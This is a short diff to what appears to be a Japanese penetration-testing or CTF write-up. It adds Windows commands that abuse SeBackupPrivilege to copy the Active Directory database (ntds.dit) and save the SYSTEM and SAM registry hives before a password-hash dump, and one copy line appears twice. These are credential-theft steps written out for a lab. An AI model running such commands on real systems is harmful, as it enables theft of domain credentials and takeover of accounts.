@@ -322,7 +322,10 @@ Copy-FileSeBackupPrivilege C:\Users\Administrator\proof.txt C:\Users\Public\proo
 
 ```
 Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\tmp\ntds.dit -overwrite
+Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\tmp\ntds.dit -overwrite
+
 reg save HKLM\SYSTEM c:\tmp\system
+reg save HKLM\SAM C:\tmp\sam
 ```
 
 ### パスワードハッシュをdump
